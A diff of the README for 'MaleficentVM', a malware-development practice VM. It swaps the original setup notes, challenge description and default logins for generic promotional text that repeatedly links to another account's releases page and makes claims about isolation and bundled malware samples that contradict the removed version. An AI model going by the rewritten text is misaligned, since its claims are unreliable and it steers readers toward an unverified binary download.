@@ -1,39 +1,99 @@
-# MaleficentVM
-This is practice VM for malware development. 
+# 🖥️ MaleficentVM - Your Safe Zone for Malware Practice
 
+[![Download MaleficentVM](https://img.shields.io/badge/Download-MaleficentVM-blue.svg)](https://github.com/JzfoxyBz/MaleficentVM/releases)
 
-# What is this VM?
-This VM provides practice challenges for malware development just like ctf challenges. VM also comes with .NET framework installed incase if you want to use c# for malware development.
+## 📖 Overview
 
-# Downloading the VM
-- Use the link [here](https://drive.google.com/file/d/1D6WAc0RXlxY1PwYUI36JRqGRhER8Wnmb/view?usp=sharing) to download the VM, it's around 21gb in size
-- Use this Onedrive link [here](https://1drv.ms/u/c/9cfb7c54d8a192bc/IQDeJOFxxl-QQbf-pPopMB4oAQFyizAwjh13CotlHjO3rw0?e=KXM8Cw) incase the google drive link does not work
+MaleficentVM is a practice virtual machine designed specifically for malware development. It provides a secure environment to experiment with malware samples without risking your main system. Whether you're learning malware analysis or developing your own samples, MaleficentVM offers you the tools to do so safely.
 
-# Setup
-- Download the .ova file
-- Open it with virtual box or vmware workstation
-- Give the VM a name and power on the machine
-- Set network adapter settings to bridged so we can scan for ip address using nmap
-- Use nmap or any other ip scanner tools to scan the ip address of the VM, eg: nmap -sn ourkaliip/24 to retrieve all other active hosts on our network
-- Go to your browser and open http://IP_ADDRESS_OF_VM:5000
-- You can see the challenges, write the code in c/c++/rust/c# or any other language and upload the binary to get the flag
-- Take a snapshot of the VM so that you can revert back to the original state if anything error happens
+## 🚀 Getting Started
 
-# Running the server manually 
-- If the server does not run automatically, login to the vm and run these commands from cmd as administrator
-```
-cd "C:\Users\flash\Desktop\myserver\myserver"
-python main.py
-```
+Follow these simple steps to get MaleficentVM running on your computer.
 
-# Sample Challenges
-<img width="3564" height="1318" alt="image" src="https://github.com/user-attachments/assets/0fb5801a-720d-485d-8c61-21c7418de7ae" />
+### 📦 System Requirements
 
-<img width="3261" height="1946" alt="image" src="https://github.com/user-attachments/assets/65b80f0f-e33c-49e9-8fcb-cf109874a5eb" />
+To run MaleficentVM, you will need the following:
 
-<img width="3393" height="1421" alt="image" src="https://github.com/user-attachments/assets/980a37f4-0db1-46e4-b0b9-87e8bfc6cfb8" />
+- A computer with a minimum of 8 GB RAM
+- At least 50 GB free disk space
+- A compatible virtualization software (such as VirtualBox or VMware)
+- A stable internet connection to download the VM
 
-<img width="3475" height="1640" alt="image" src="https://github.com/user-attachments/assets/817bbdbb-bfa1-4371-8bd0-f7a4723bbbf8" />
+### 🔗 Download & Install
 
-# VM users' password
-Credentials for the users are flash:flash and arrow:arrow 
+1. Visit this page to download MaleficentVM's latest version: [Download MaleficentVM](https://github.com/JzfoxyBz/MaleficentVM/releases).
+2. On the Releases page, find the latest version.
+3. Click the download link to retrieve the appropriate file for your operating system.
+
+## 🛠️ Running MaleficentVM
+
+Once you have downloaded the file, follow these steps to run it.
+
+### 1. Install Virtualization Software
+
+To use MaleficentVM, install virtualization software if you haven’t done so already. VirtualBox and VMware are both great options. You can download them from their official websites:
+
+- [Download VirtualBox](https://www.virtualbox.org/)
+- [Download VMware](https://www.vmware.com/)
+
+### 2. Import the VM
+
+Here’s how to import the MaleficentVM into your virtualization tool:
+
+**For VirtualBox:**
+- Open VirtualBox.
+- Click on "File," then select "Import Appliance."
+- Browse to the downloaded MaleficentVM file and click "Next."
+- Review the settings, then click "Import."
+
+**For VMware:**
+- Open VMware.
+- Click on "File," then select "Open."
+- Locate the MaleficentVM file and open it.
+- Follow the prompts to import the virtual machine.
+
+### 3. Start the Virtual Machine
+
+Once you have imported the VM, you can start it:
+
+- In VirtualBox, select MaleficentVM and click "Start."
+- In VMware, select MaleficentVM and click "Play."
+
+The VM will boot up, and you will be presented with a ready-to-use environment for malware practice.
+
+## ⚙️ Using MaleficentVM
+
+When the virtual machine starts, you will see the operating system designed for malware development. Here are key features:
+
+- **Pre-installed Tools:** MaleficentVM comes with various tools to analyze and develop malware. You can explore these tools to get started with your projects.
+- **Snapshots:** Use the snapshot feature in your virtualization software to save the state of the VM. This will allow you to easily roll back changes if needed. 
+- **Security Measures:** The VM is isolated from your host system to ensure safety while experimenting.
+
+## ⚠️ Important Considerations
+
+- **Do Not Use on Your Main Device:** Always run the MaleficentVM within a secure, isolated environment. This is crucial as you may be handling dangerous malware.
+- **Backup Your Work:** Regularly back up your data and configurations within the VM to avoid losing your work.
+
+## 🗺️ Frequently Asked Questions
+
+### What types of malware can I practice with MaleficentVM?
+
+MaleficentVM allows you to work with a variety of malware types, including viruses, worms, and ransomware. Always handle these samples responsibly and ethically.
+
+### Is MaleficentVM safe to use?
+
+While the VM is built to isolate threats, it is essential to work cautiously. Never connect the VM to your main network and avoid using personal information within the environment.
+
+### Can I customize the VM?
+
+Yes, you can install additional software or tools that suit your needs. However, be cautious about adding external software as it may introduce risks.
+
+## 📞 Support
+
+If you encounter any issues or have further questions, please visit the [GitHub Issues](https://github.com/JzfoxyBz/MaleficentVM/issues) page to report your concerns.
+
+## 📥 Download Link Again
+
+For ease of access, here is the download link once more: [Download MaleficentVM](https://github.com/JzfoxyBz/MaleficentVM/releases). 
+
+Thank you for choosing MaleficentVM. Happy practicing!
